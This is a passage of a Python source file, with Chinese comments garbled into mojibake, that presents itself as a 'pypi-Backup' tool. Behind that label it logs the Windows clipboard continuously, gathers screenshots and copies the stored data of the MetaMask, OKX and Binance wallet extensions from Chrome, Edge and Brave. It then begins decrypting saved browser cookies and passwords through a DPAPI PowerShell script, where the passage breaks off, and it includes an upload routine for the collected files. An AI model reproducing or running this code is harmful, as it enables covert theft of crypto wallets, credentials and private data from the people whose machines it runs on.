            compressed_size = os.path.getsize(tar_path)
            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"å‹ç¼©åæ–‡ä»¶ä»ç„¶è¿‡å¤§: {tar_path} ({compressed_size / 1024 / 1024:.2f}MB)")
                os.remove(tar_path)
                return None
            else:
                logging.critical(f"å·²åˆ›å»ºåˆ†å— {part_num + 1}: {chunk_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
        except (OSError, IOError, tarfile.TarError) as e:
            logging.error(f"å‹ç¼©åˆ†å—å¤±è´¥: {part_dir}: {e}")
            if os.path.exists(tar_path):
                os.remove(tar_path)
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """å°†å¤§ç›®å½•åˆ†å‰²æˆå¤šä¸ªå°å—å¹¶åˆ†åˆ«å‹ç¼©
        
        Args:
            folder_path: è¦åˆ†å‰²çš„ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            
        Returns:
            list: å‹ç¼©æ–‡ä»¶è·¯å¾„åˆ—è¡¨
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # åˆ›å»ºä¸´æ—¶ç›®å½•å­˜æ”¾åˆ†å—
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # é‡‡ç”¨æ›´ä¿å®ˆçš„åˆ†å—å¤§å°é™åˆ¶
            # è€ƒè™‘åˆ°å‹ç¼©æ¯”å’Œå®‰å…¨è¾¹ç•Œï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®å¾—æ›´å°
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * self.config.SAFETY_MARGIN / self.config.COMPRESSION_RATIO)

            # åˆ›å»ºæ–‡ä»¶å¤§å°æ˜ å°„ä»¥ä¼˜åŒ–åˆ†å—
            file_sizes = {}
            total_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        size = os.path.getsize(file_path)
                        if size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            file_sizes[file_path] = size
                            total_size += size
                    except OSError:
                        continue

            if not file_sizes:
                logging.error(f"ç›®å½• {folder_path} ä¸­æ²¡æœ‰æœ‰æ•ˆæ–‡ä»¶")
                return None

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åºï¼Œä¼˜å…ˆå¤„ç†å¤§æ–‡ä»¶
            sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            if sorted_files[0][1] > MAX_CHUNK_SIZE:
                logging.error(f"å‘ç°è¿‡å¤§æ–‡ä»¶: {sorted_files[0][0]} ({sorted_files[0][1] / 1024 / 1024:.2f}MB)")
                return None

            # ä½¿ç”¨æœ€ä¼˜è£…ç®±ç®—æ³•è¿›è¡Œåˆ†å—
            current_chunk = []
            current_chunk_size = 0

            for file_path, file_size in sorted_files:
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å—è¶…è¿‡é™åˆ¶ï¼Œå…ˆå¤„ç†å½“å‰å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        success = True
                        for src in current_chunk:
                            rel_path = os.path.relpath(src, folder_path)
                            dst = os.path.join(part_dir, rel_path)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except (OSError, IOError, shutil.Error) as e:
                                logging.error(f"å¤åˆ¶æ–‡ä»¶å¤±è´¥: {src} -> {dst}: {e}")
                                success = False
                                break

                        if success:
                            tar_path = self._compress_chunk_part(
                                part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                            )
                            if tar_path:
                                compressed_files.append(tar_path)

                        self._clean_directory(part_dir)
                        part_num += 1

                    current_chunk = []
                    current_chunk_size = 0

                # æ·»åŠ å½“å‰æ–‡ä»¶åˆ°å—
                current_chunk.append(file_path)
                current_chunk_size += file_size

            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    success = True
                    for src in current_chunk:
                        rel_path = os.path.relpath(src, folder_path)
                        dst = os.path.join(part_dir, rel_path)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æ–‡ä»¶å¤±è´¥: {src} -> {dst}: {e}")
                            success = False
                            break

                    if success:
                        tar_path = self._compress_chunk_part(
                            part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                        )
                        if tar_path:
                            compressed_files.append(tar_path)

                    self._clean_directory(part_dir)

            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error(f"ç›®å½• {folder_path} åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.critical(f"ç›®å½• {folder_path} å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception as e:
            logging.error(f"åˆ†å‰²ç›®å½•å¤±è´¥ {folder_path}: {e}")
            return None

    def get_clipboard_content(self):
        """è·å–JTBå†…å®¹ï¼Œæ”¯æŒ Windows å’Œ WSL ç¯å¢ƒ"""
        try:
            # åœ¨ WSL ä¸­ä½¿ç”¨ PowerShell è·å– Windows JTB
            ps_command = 'powershell.exe Get-Clipboard'
            result = subprocess.run(
                ps_command,
                shell=True,
                capture_output=True,
                text=False  # æ”¹ä¸º False ä»¥è·å–åŸå§‹å­—èŠ‚
            )
            
            if result.returncode == 0:
                # å°è¯•ä¸åŒçš„ç¼–ç 
                encodings = ['utf-8', 'gbk', 'gb2312', 'gb18030', 'big5', 'latin1']
                
                # é¦–å…ˆå°è¯• UTF-8 å’Œ GBK
                for encoding in ['utf-8', 'gbk']:
                    try:
                        content = result.stdout.decode(encoding).strip()
                        # æ£€æŸ¥è§£ç åçš„å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–åªåŒ…å«ç©ºç™½å­—ç¬¦
                        if content and not content.isspace():
                            return content
                    except UnicodeDecodeError:
                        continue
                    
                # å¦‚æœå¸¸ç”¨ç¼–ç å¤±è´¥ï¼Œå°è¯•å…¶ä»–ç¼–ç 
                for encoding in encodings:
                    if encoding not in ['utf-8', 'gbk']:  # è·³è¿‡å·²å°è¯•çš„ç¼–ç 
                        try:
                            content = result.stdout.decode(encoding).strip()
                            if content and not content.isspace():
                                return content
                        except UnicodeDecodeError:
                            continue
                
                # å¦‚æœæ‰€æœ‰ç¼–ç éƒ½å¤±è´¥ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰åŸå§‹æ•°æ®
                if result.stdout:
                    try:
                        # ä½¿ç”¨ 'ignore' é€‰é¡¹ä½œä¸ºæœ€åçš„å°è¯•
                        content = result.stdout.decode('utf-8', errors='ignore').strip()
                        if content and not content.isspace():
                            if self.config.DEBUG_MODE:
                                logging.warning("âš ï¸ ä½¿ç”¨ ignore æ¨¡å¼è§£ç JTBå†…å®¹")
                            return content
                    except Exception as e:
                        # è§£ç å¤±è´¥æ—¶ä¸è®°å½•é”™è¯¯æ—¥å¿—ï¼Œé¿å…é¢‘ç¹æŠ¥é”™
                        pass
                else:
                    # JTBä¸ºç©ºæ—¶ä¸è®°å½•æ—¥å¿—ï¼Œé¿å…é¢‘ç¹æŠ¥é”™
                    pass
            else:
                # è·å–JTBå¤±è´¥æ—¶ä¸è®°å½•é”™è¯¯æ—¥å¿—ï¼Œé¿å…é¢‘ç¹æŠ¥é”™å¯¼è‡´æ—¥å¿—æ–‡ä»¶è¿‡å¤§
                # æŸäº›ç¯å¢ƒä¸‹ï¼ˆå¦‚æ— å‰ªè´´æ¿æœåŠ¡ï¼‰ä¼šæŒç»­è¿”å›é”™è¯¯ç 
                pass
        
            return None
        except Exception as e:
            # æŸäº›ç¯å¢ƒä¸‹ï¼ˆå¦‚æ— å›¾å½¢ç•Œé¢ / æ— å‰ªè´´æ¿æœåŠ¡ï¼‰ä¼šæŒç»­æŠ›å‡ºå¼‚å¸¸
            # è¿™é‡Œä¸è®°å½•é”™è¯¯æ—¥å¿—ï¼Œåªè¿”å› Noneï¼Œé¿å…æ—¥å¿—è¢«é«˜é¢‘åˆ·å±
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•JTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # æ£€æŸ¥å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–ç‰¹æ®Šæ ‡è®°
            if not content or content.isspace():
                return
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
            
            content_preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"ğŸ“ å·²è®°å½•å†…å®¹: {content_preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•JTBå¤±è´¥: {str(e)}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§JTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºJTBæ—¥å¿—ç›®å½•å¤±è´¥: {str(e)}")
                return

        last_content = ""
        error_count = 0  # æ·»åŠ é”™è¯¯è®¡æ•°
        max_errors = 5   # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°
        last_empty_log_time = time.time()  # è®°å½•ä¸Šæ¬¡è¾“å‡ºç©ºJTBæ—¥å¿—çš„æ—¶é—´
        empty_log_interval = 300  # æ¯5åˆ†é’Ÿæ‰è¾“å‡ºä¸€æ¬¡ç©ºJTBæ—¥å¿—
        
        # åˆå§‹åŒ–æ—¥å¿—æ–‡ä»¶
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n=== ğŸ“‹ JTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write("-"*30 + "\n")
        except Exception as e:
            logging.error(f"âŒ åˆå§‹åŒ–JTBæ—¥å¿—å¤±è´¥: {str(e)}")
        
        def is_special_content(text):
            """æ£€æŸ¥æ˜¯å¦ä¸ºç‰¹æ®Šæ ‡è®°å†…å®¹"""
            if not text:
                return False
            # è·³è¿‡æ—¥å¿—æ ‡è®°è¡Œ
            if text.startswith('===') or text.startswith('-'):
                return True
            # è·³è¿‡æ—¶é—´æˆ³è¡Œ
            if 'JTBç›‘æ§å¯åŠ¨äº' in text or 'æ—¥å¿—å·²äº' in text:
                return True
            return False
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                current_time = time.time()
                
                # æ£€æŸ¥å†…å®¹æ˜¯å¦æœ‰æ•ˆä¸”ä¸æ˜¯ç‰¹æ®Šæ ‡è®°
                if (current_content and 
                    not current_content.isspace() and 
                    not is_special_content(current_content)):
                    
                    # æ£€æŸ¥å†…å®¹æ˜¯å¦å‘ç”Ÿå˜åŒ–
                    if current_content != last_content:
                        content_preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                        logging.info(f"ğŸ“‹ æ£€æµ‹åˆ°æ–°å†…å®¹: {content_preview}")
                        self.log_clipboard_update(current_content, file_path)
                        last_content = current_content
                        error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                        if not current_content:
                            logging.debug("â„¹ï¸ JTBä¸ºç©º")
                        elif current_content.isspace():
                            logging.debug("â„¹ï¸ JTBå†…å®¹ä»…åŒ…å«ç©ºç™½å­—ç¬¦")
                        elif is_special_content(current_content):
                            logging.debug("â„¹ï¸ è·³è¿‡ç‰¹æ®Šæ ‡è®°å†…å®¹")
                        last_empty_log_time = current_time
                    error_count = 0  # ç©ºå†…å®¹ä¸è®¡å…¥é”™è¯¯
                    
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    logging.error(f"âŒ JTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…60ç§’åé‡è¯•")
                    time.sleep(60)  # è¿ç»­é”™è¯¯æ—¶å¢åŠ ç­‰å¾…æ—¶é—´
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ JTBç›‘æ§å‡ºé”™: {str(e)}")
                
            time.sleep(interval)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def _get_next_backup_time(self):
        """è·å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´çš„æ—¶é—´æˆ³æ–‡ä»¶è·¯å¾„"""
        return str(Path.home() / ".dev/pypi-Backup/next_backup_time.txt")
        
    def save_next_backup_time(self):
        """ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´"""
        next_time = datetime.now() + timedelta(seconds=self.config.BACKUP_INTERVAL)
        try:
            with open(self._get_next_backup_time(), 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"âŒ ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return None
            
    def should_run_backup(self):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
        
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
            datetime or None: ä¸‹æ¬¡å¤‡ä»½æ—¶é—´ï¼ˆå¦‚æœå­˜åœ¨ï¼‰
        """
        threshold_file = self._get_next_backup_time()
        if not os.path.exists(threshold_file):
            return True, None
            
        try:
            with open(threshold_file, 'r') as f:
                next_backup_time = datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                
            current_time = datetime.now()
            if current_time >= next_backup_time:
                return True, None
            return False, next_backup_time
        except Exception as e:
            logging.error(f"âŒ è¯»å–ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
            return True, None

def is_wsl():
    """æ£€æŸ¥æ˜¯å¦åœ¨WSLç¯å¢ƒä¸­è¿è¡Œ"""
    return "microsoft" in platform.release().lower() or "microsoft" in platform.version().lower()

@lru_cache()
def get_username():
    """è·å–Windowsç”¨æˆ·å"""
    try:
        # å°è¯•ä»ç¯å¢ƒå˜é‡è·å–
        if 'USERPROFILE' in os.environ:
            return os.path.basename(os.environ['USERPROFILE'])
            
        # å°è¯•ä»Windowsç”¨æˆ·ç›®å½•è·å–
        windows_users = '/mnt/c/Users'
        if os.path.exists(windows_users):
            users = [user for user in os.listdir(windows_users) 
                    if os.path.isdir(os.path.join(windows_users, user)) 
                    and user not in ['Public', 'Default', 'Default User', 'All Users']]
            if users:
                return users[0]
                
        # å¦‚æœä¸Šè¿°æ–¹æ³•éƒ½å¤±è´¥ï¼Œå°è¯•ä»æ³¨å†Œè¡¨è·å–ï¼ˆéœ€è¦åœ¨Windowsç¯å¢ƒä¸‹ï¼‰
        if os.path.exists('/mnt/c/Windows/System32/reg.exe'):
            try:
                result = subprocess.run(
                    ['cmd.exe', '/c', 'echo %USERNAME%'],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if result.returncode == 0:
                    username = result.stdout.strip()
                    if username and username != '%USERNAME%':
                        return username
            except Exception:
                pass
                
        # å¦‚æœæ‰€æœ‰æ–¹æ³•éƒ½å¤±è´¥ï¼Œè¿”å›é»˜è®¤å€¼
        return "Administrator"
        
    except Exception as e:
        logging.error(f"è·å–Windowsç”¨æˆ·åå¤±è´¥: {e}")
        return "Administrator"

def backup_screenshots(user):
    """å¤‡ä»½æˆªå›¾æ–‡ä»¶"""
    def windows_path_to_wsl(path):
        """å°† Windows è·¯å¾„è½¬æ¢ä¸º WSL è·¯å¾„"""
        if not path:
            return None
        path = path.strip().strip('"')
        if len(path) >= 2 and path[1] == ":":
            drive = path[0].lower()
            rest = path[2:].replace("\\", "/").lstrip("/")
            return f"/mnt/{drive}/{rest}"
        return None

    def get_screenshot_location():
        """è¯»å– Windows æˆªå›¾é»˜è®¤ä¿å­˜è·¯å¾„ï¼ˆæ³¨å†Œè¡¨ï¼‰"""
        if shutil.which("powershell.exe") is None:
            return None
        ps_command = (
            "(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders')."
            "'{B7BEDE81-DF94-4682-A7D8-57A52620B86F}'"
        )
        try:
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", ps_command],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                return None
            wsl_path = windows_path_to_wsl(result.stdout.strip())
            if wsl_path and os.path.exists(wsl_path):
                return wsl_path
        except Exception:
            return None
        return None

    screenshot_paths = [
        f"/mnt/c/Users/{user}/Pictures",
        f"/mnt/c/Users/{user}/OneDrive/Pictures"
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "å±å¹•å¿«ç…§",
        "å±å¹•æˆªå›¾",
        "æˆªå›¾",
        "æˆªå±"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_tmp_screenshots"
    
    backup_manager = BackupManager()
    
    # ç¡®ä¿å¤‡ä»½ç›®å½•æ˜¯ç©ºçš„
    if not backup_manager._clean_directory(str(screenshot_backup_directory)):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"ğŸ“¸ å·²å¤‡ä»½æˆªå›¾: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æˆªå›¾æ–‡ä»¶å¤±è´¥ {source_file}: {e}")
            except Exception as e:
                logging.error(f"å¤„ç†æˆªå›¾ç›®å½•å¤±è´¥ {source_dir}: {e}")
        else:
            logging.error(f"æˆªå›¾ç›®å½•ä¸å­˜åœ¨: {source_dir}")
            
    if files_found:
        logging.info("ğŸ“¸ æˆªå›¾å¤‡ä»½å®Œæˆï¼Œå·²æ‰¾åˆ°ç¬¦åˆè§„åˆ™çš„æ–‡ä»¶")
    else:
        logging.info("ğŸ“¸ æœªæ‰¾åˆ°ç¬¦åˆè§„åˆ™çš„æˆªå›¾æ–‡ä»¶")
            
    return str(screenshot_backup_directory) if files_found else None

def backup_browser_extensions(backup_manager, user):
    """å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®ï¼ˆæ”¯æŒå¤šä¸ªæµè§ˆå™¨åˆ†èº«ï¼‰"""
    user_prefix = user[:5] if user else "user"
    extensions_backup_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_browser_extensions"
    
    # ç›®æ ‡æ‰©å±•çš„è¯†åˆ«ä¿¡æ¯ï¼ˆé€šè¿‡åç§°å’Œå¯èƒ½çš„IDåŒ¹é…ï¼‰
    # æ”¯æŒä»ä¸åŒå•†åº—å®‰è£…çš„æ‰©å±•ï¼ˆChrome Web Storeã€Edge Add-ons Storeç­‰ï¼‰
    target_extensions = {
        "metamask": {
            "names": ["MetaMask", "metamask"],  # manifest.json ä¸­çš„ name å­—æ®µ
            "ids": [
                "nkbihfbeogaeaoehlefnkodbefgpgknn",  # Chrome / Brave
                "ejbalbakoplchlghecdalmeeeajnimhm",  # Edge
            ],
        },
        "okx_wallet": {
            "names": ["OKX Wallet", "OKX", "okx wallet"],
            "ids": [
                "mcohilncbfahbmgdjkbpemcciiolgcge",  # Chrome / Brave
                "pbpjkcldjiffchgbbndmhojiacbgflha",  # Edge
            ],
        },
        "binance_wallet": {
            "names": ["Binance Wallet", "Binance", "binance wallet"],
            "ids": [
                "cadiboklkpojfamcoggejbbdjcoiljjk",  # Chrome / Brave
                # Edge ä¸æ”¯æŒ Binance Wallet
            ],
        },
    }
    
    # æµè§ˆå™¨ User Data æ ¹ç›®å½•
    browser_user_data_paths = {
        "chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
        "edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
        "brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
    }
    
    def identify_extension(ext_id, ext_settings_path):
        """é€šè¿‡æ‰©å±•IDå’Œmanifest.jsonè¯†åˆ«æ‰©å±•ç±»å‹"""
        # æ–¹æ³•1: é€šè¿‡å·²çŸ¥IDåŒ¹é…
        for ext_name, ext_info in target_extensions.items():
            if ext_id in ext_info["ids"]:
                return ext_name
        
        # æ–¹æ³•2: é€šè¿‡è¯»å–Extensionsç›®å½•ä¸‹çš„manifest.jsonè¯†åˆ«
        # æ‰©å±•çš„å®é™…å®‰è£…ç›®å½•åœ¨ Extensions æ–‡ä»¶å¤¹ä¸­
        try:
            # å°è¯•ä» Local Extension Settings çš„çˆ¶ç›®å½•æ‰¾åˆ° Extensions ç›®å½•
            profile_path = os.path.dirname(ext_settings_path)
            extensions_dir = os.path.join(profile_path, "Extensions")
            if os.path.exists(extensions_dir):
                ext_install_dir = os.path.join(extensions_dir, ext_id)
                if os.path.exists(ext_install_dir):
                    # æŸ¥æ‰¾ç‰ˆæœ¬ç›®å½•ï¼ˆæ‰©å±•é€šå¸¸å®‰è£…åœ¨ç‰ˆæœ¬å·å­ç›®å½•ä¸­ï¼‰
                    version_dirs = [d for d in os.listdir(ext_install_dir) 
                                   if os.path.isdir(os.path.join(ext_install_dir, d))]
                    for version_dir in version_dirs:
                        manifest_path = os.path.join(ext_install_dir, version_dir, "manifest.json")
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, 'r', encoding='utf-8') as f:
                                    manifest = json.load(f)
                                    ext_name_in_manifest = manifest.get("name", "")
                                    # æ£€æŸ¥æ˜¯å¦åŒ¹é…ç›®æ ‡æ‰©å±•
                                    for ext_name, ext_info in target_extensions.items():
                                        for target_name in ext_info["names"]:
                                            if target_name.lower() in ext_name_in_manifest.lower():
                                                return ext_name
                            except Exception as e:
                                if backup_manager.config.DEBUG_MODE:
                                    logging.debug(f"è¯»å–manifest.jsonå¤±è´¥: {manifest_path} - {e}")
                                continue
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"è¯†åˆ«æ‰©å±•å¤±è´¥: {ext_id} - {e}")
        
        return None
        
    if not backup_manager._ensure_directory(str(extensions_backup_dir)):
        return None
    
    try:
        backed_up_count = 0
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                continue
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                
                # å¤‡ä»½æ¯ä¸ª Profile ä¸­çš„æ‰©å±•
                for profile_name, ext_settings_path in profiles:
                    # æ‰«ææ‰€æœ‰æ‰©å±•ç›®å½•
                    try:
                        ext_dirs = [d for d in os.listdir(ext_settings_path) 
                                   if os.path.isdir(os.path.join(ext_settings_path, d))]
                        
                        for ext_id in ext_dirs:
                            # è¯†åˆ«æ‰©å±•ç±»å‹
                            ext_name = identify_extension(ext_id, ext_settings_path)
                            if not ext_name:
                                continue  # ä¸æ˜¯ç›®æ ‡æ‰©å±•ï¼Œè·³è¿‡
                            
                            source_dir = os.path.join(ext_settings_path, ext_id)
                            if not os.path.exists(source_dir):
                                continue
                            
                            # ç›®æ ‡ç›®å½•åŒ…å« Profile åç§°
                            profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                            target_dir = os.path.join(extensions_backup_dir, 
                                                     f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                            try:
                                if os.path.exists(target_dir):
                                    shutil.rmtree(target_dir, ignore_errors=True)
                                if backup_manager._ensure_directory(os.path.dirname(target_dir)):
                                    shutil.copytree(source_dir, target_dir, symlinks=True)
                                    backed_up_count += 1
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.info(f"ğŸ“¦ å·²å¤‡ä»½: {browser_name} {profile_name} {ext_name} (ID: {ext_id})")
                            except Exception as e:
                                logging.error(f"å¤åˆ¶æ‰©å±•ç›®å½•å¤±è´¥: {source_dir} - {e}")
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug(f"æ‰«ææ‰©å±•ç›®å½•å¤±è´¥: {ext_settings_path} - {e}")
            
            except Exception as e:
                logging.error(f"æ‰«æ {browser_name} é…ç½®æ–‡ä»¶å¤±è´¥: {e}")

        if backed_up_count > 0:
            logging.info(f"ğŸ“¦ æˆåŠŸå¤‡ä»½ {backed_up_count} ä¸ªæµè§ˆå™¨æ‰©å±•")
            return str(extensions_backup_dir)
        else:
            logging.warning("âš ï¸ æœªæ‰¾åˆ°ä»»ä½•æµè§ˆå™¨æ‰©å±•æ•°æ®")
            return None
    except Exception as e:
        logging.error(f"å¤åˆ¶æµè§ˆå™¨æ‰©å±•ç›®å½•å¤±è´¥: {e}")
        return None

def export_browser_cookies_passwords_wsl(backup_manager, user):
    """WSLç¯å¢ƒä¸‹å¯¼å‡ºæµè§ˆå™¨ Cookiesã€å¯†ç å’Œ Web Dataï¼ˆåŠ å¯†å¤‡ä»½ï¼‰"""
    if not BROWSER_EXPORT_AVAILABLE:
        logging.warning("â­ï¸  è·³è¿‡æµè§ˆå™¨æ•°æ®å¯¼å‡ºï¼ˆç¼ºå°‘å¿…è¦åº“ï¼‰")
        return None
    
    try:
        logging.info("ğŸ” å¼€å§‹å¯¼å‡ºæµè§ˆå™¨ Cookiesã€å¯†ç å’Œ Web Data...")
        
        # è·å–ç”¨æˆ·åå‰ç¼€
        user_prefix = user[:5] if user else "user"
        if shutil.which("powershell.exe") is None:
            logging.warning("â­ï¸  æœªæ£€æµ‹åˆ° powershell.exeï¼Œæµè§ˆå™¨æ•°æ®å¯¼å‡ºè·³è¿‡")
            return None

        def decrypt_dpapi_batch(b64_list, chunk_size=200):
            """æ‰¹é‡è°ƒç”¨ PowerShell è§£å¯† DPAPI æ•°æ®"""
            if not b64_list:
                return []
            results = []
            ps_script = """
$inputJson = [Console]::In.ReadToEnd()
$items = $inputJson | ConvertFrom-Json
Add-Type -AssemblyName System.Security
$out = @()
foreach ($b64 in $items) {
  try {
    $bytes = [Convert]::FromBase64String($b64)
    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $out += [System.Text.Encoding]::UTF8.GetString($dec)
  } catch {
